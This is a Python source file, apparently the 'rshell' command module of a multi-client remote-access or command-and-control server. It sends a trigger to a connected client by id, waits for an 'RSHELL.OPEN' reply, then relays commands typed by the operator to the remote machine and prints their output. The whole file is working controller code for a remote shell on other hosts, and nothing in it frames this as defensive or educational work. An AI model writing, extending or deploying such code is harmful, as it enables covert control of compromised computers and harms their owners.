# commands/rshell.py
import socket
import subprocess
import threading
import time

from colorama import Style, Fore

requires_id = True

argumentError = "Usage: rshell <client_id>"
expectedNumArgs = 1
requires_id = True


# commands/rshell.py
def execute(conn, id, args, clients):
    conn.sendall(b'RSHELL')
    conn.settimeout(1)  # Set a timeout of 1 second
    success = False
    for i in range(0, 5):
        try:
            data = conn.recv(1024)
            if str(data) == "b'RSHELL.OPEN'":
                success = True
                break
        except socket.timeout:
            print(Fore.RED + "Error establishing connection to RSHELL. " + Style.RESET_ALL + "Attempt: " + str(
                i + 1) + "/5")
        time.sleep(1)
    conn.settimeout(None)  # Remove the timeout
    if not success:
        print(Fore.RED + "Failed to establish connection to RSHELL." + Style.RESET_ALL)
        return
    rshell_thread(conn)

    # threading.Thread(target=rshell_thread, args=(conn,), daemon=True).start()


def rshell_thread(conn):
    hostname = conn.getpeername()[0]
    while True:
        command = input("<" + hostname + ">: " + Style.RESET_ALL)
        if command.lower() == 'exit':
            conn.sendall(b'exit')
            break
        conn.sendall(command.encode())
        results = b''

        while True:
            if results.endswith(b'\n'):
                break
            else:
                chunk = conn.recv(1024)
                if not chunk:
                    break
                results += chunk  # you don't want to strip this, because then you'll lose the newline when the actual result includes a newline
        if results.decode("utf-8").strip() == 'NONE':
            print(
                Fore.YELLOW + "Warning:" + Style.RESET_ALL + " No results received. In Windows, this usually means the command succeeded.")
        else:
            print("<" + hostname + ">: {}".format(results.decode('utf-8')))
